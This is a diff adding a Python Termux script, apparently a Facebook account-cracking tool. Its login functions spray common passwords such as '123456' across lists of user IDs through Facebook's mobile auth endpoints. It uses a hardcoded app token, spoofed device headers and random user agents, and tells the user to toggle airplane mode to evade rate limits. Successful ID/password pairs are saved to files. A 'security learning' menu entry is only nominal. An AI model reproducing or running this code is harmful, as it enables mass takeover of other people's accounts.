+    meth = input(f"    {CYAN}[•] Choice (1/2): {RESET}").strip()
+    with tred(max_workers=30) as pool:
+        ____banner____()
+        print(f"    {GREEN}[•] TOTAL ID FROM CRACK : {limit}{RESET}")
+        print(f"    {YELLOW}[•] AIRPLANE MOD [ON/OFF] FOR BEST RESULT{RESET}")
+        linex_custom()
+        for uid in user:
+            if meth == '1' or meth.upper() == 'A':
+                pool.submit(login_1, uid)
+            else:
+                pool.submit(login_2, uid)
+
+def linex_custom():
+    print(CYAN + '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━' + RESET)
+
+oks = []
+cps = []
+loop = 0
+
+def user_agent699():
+    aV = str(random.choice(range(10, 20)))
+    A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}"
+    bV = str(random.choice(range(1, 36)))
+    bx = str(random.choice(range(34, 38)))
+    bz = f'5{bx}.{bV}'
+    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
+    cV = str(random.choice(range(1, 36)))
+    cx = str(random.choice(range(34, 38)))
+    cz = f'5{cx}.{cV}'
+    C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
+    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36"
+    return random.choice([A, B, C, D])
+
+def login_1(uid):
+    global loop
+    session = requests.session()
+    try:
+        sys.stdout.write(f"\r{CYAN}[KAMAL-M1] [{loop}] [SUCCESSFUL:{len(oks)}]{RESET}")
+        sys.stdout.flush()
+        for pw in ('123456', '1234567', '12345678', '123456789'):
+            data = {
+                'adid': str(uuid.uuid4()),
+                'format': 'json',
+                'device_id': str(uuid.uuid4()),
+                'cpl': 'true',
+                'family_device_id': str(uuid.uuid4()),
+                'credentials_type': 'device_based_login_password',
+                'error_detail_type': 'button_with_disabled',
+                'source': 'device_based_login',
+                'email': str(uid),
+                'password': str(pw),
+                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+                'generate_session_cookies': '1',
+                'meta_inf_fbmeta': '',
+                'advertiser_id': str(uuid.uuid4()),
+                'currently_logged_in_userid': '0',
+                'locale': 'en_US',
+                'client_country_code': 'US',
+                'method': 'auth.login',
+                'fb_api_req_friendly_name': 'authenticate',
+                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
+                'api_key': '882a8490361da98702bf97a021ddc14d'
+            }
+            headers = {
+                'User-Agent': user_agent699(),
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'Host': 'graph.facebook.com',
+                'X-FB-Net-HNI': '25227',
+                'X-FB-SIM-HNI': '29752',
+                'X-FB-Connection-Type': 'MOBILE.LTE',
+                'X-Tigon-Is-Retry': 'False',
+                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
+                'x-fb-device-group': '5120',
+                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+                'X-FB-Request-Analytics-Tags': 'graphservice',
+                'X-FB-HTTP-Engine': 'Liger',
+                'X-FB-Client-IP': 'True',
+                'X-FB-Server-Cluster': 'True',
+                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
+            }
+            try:
+                res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False, timeout=15).json()
+            except:
+                continue
+
+            if 'session_key' in res:
+                flag = get_country_flag(uid)
+                print(f"\n{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
+                print(f"{YELLOW}[{flag}]{RESET} {GREEN}{uid} = {pw} = {CYAN}{creationyear(uid)}{RESET}")
+                print(f"{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
+                open('/sdcard/KAMAL-OLD-M1-SUCCESSFUL.txt', 'a').write(f"{uid}|{pw}\n")
+                oks.append(uid)
+                break
+            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
+                flag = get_country_flag(uid)
+                print(f"\n{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
+                print(f"{YELLOW}[{flag}]{RESET} {GREEN}{uid} = {pw} = {CYAN}{creationyear(uid)}{RESET}")
+                print(f"{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
+                open('/sdcard/KAMAL-OLD-M1-SUCCESSFUL.txt', 'a').write(f"{uid}|{pw}\n")
+                oks.append(uid)
+                break
+        loop += 1
+    except Exception as e:
+        pass
+
+def login_2(uid):
+    global loop
+    try:
+        sys.stdout.write(f"\r{CYAN}[KAMAL-M2] [{loop}] [SUCCESSFUL:{len(oks)}]{RESET}")
+        sys.stdout.flush()
+        for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
+            with requests.Session() as session:
+                headers = {
+                    'x-fb-connection-bandwidth': str(random.randint(20000000, 29999999)),
+                    'x-fb-sim-hni': str(random.randint(20000, 40000)),
+                    'x-fb-net-hni': str(random.randint(20000, 40000)),
+                    'x-fb-connection-quality': 'EXCELLENT',
+                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
+                    'user-agent': user_agent699(),
+                    'content-type': 'application/x-www-form-urlencoded',
+                    'x-fb-http-engine': 'Liger'
+                }
+                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
+                try:
+                    po = session.get(url, headers=headers, timeout=15).json()
+                except:
+                    continue
+
+                if 'session_key' in str(po) or 'session_key' in po:
+                    flag = get_country_flag(uid)
+                    print(f"\n{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
+                    print(f"{YELLOW}[{flag}]{RESET} {GREEN}{uid} = {pw} = {CYAN}{creationyear(uid)}{RESET}")
+                    print(f"{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
+                    open('/sdcard/KAMAL-OLD-M2-SUCCESSFUL.txt', 'a').write(f"{uid}|{pw}\n")
+                    oks.append(uid)
+                    break
+    except Exception as e:
+        pass
+    loop += 1
+
+def run():
+    while True:
+        os.system("clear")
+        banner()
+        show_menu()
+        footer()
+
+        choice = input(
+            GREEN + "RAJA@TERMUX" + CYAN + " ➜ " + RESET
+        ).strip()
+
+        if choice == "1":
+            BNG_71_()
+
+        elif choice == "2":
+            print(CYAN + "\nFACEBOOK SECURITY LEARNING" + RESET)
+            print(WHITE + "Educational information and account safety." + RESET)
+            input(MUTED + "\nPress ENTER to return to menu..." + RESET)
+
+        elif choice == "3":
+            webbrowser.open("https://www.facebook.com/")
+            input(MUTED + "\nPress ENTER to return to menu..." + RESET)
+
+        elif choice == "4":
+            print(CYAN + "\nOpening YouTube Channel..." + RESET)
+            open_link(YOUTUBE_URL)
+            input(MUTED + "\nPress ENTER to return to menu..." + RESET)
+
+        elif choice == "5":
+            print(CYAN + "\nOpening WhatsApp Group..." + RESET)
+            open_link(WHATSAPP_GROUP_URL)
+            input(MUTED + "\nPress ENTER to return to menu..." + RESET)
+
+        elif choice == "0":
+            print(GREEN + "THANK YOU FOR VISITING RAJA VAU TERMINAL!" + RESET)
+            break
+
+        else:
+            print(YELLOW + "\nInvalid option. Please try again." + RESET)
+            input(MUTED + "\nPress ENTER to return to menu..." + RESET)
+
+def footer():
+    width = max(32, shutil.get_terminal_size((80, 24)).columns)
+    print()
+    print(center(GREEN + "FOR GOOD RESULTS" + RESET, width))
+    print(center(CYAN + "USE FLIGHT MODE OFF/ON" + RESET, width))
+    print(center(YELLOW + "♥ EVERY 5 MINUTES ♥" + RESET, width))
+    print()
+
+if __name__ == "__main__":
+    try:
+        approval()
+        run()
+    except KeyboardInterrupt:
+        print(RESET + "\nExiting RAJA VAU Terminal...")
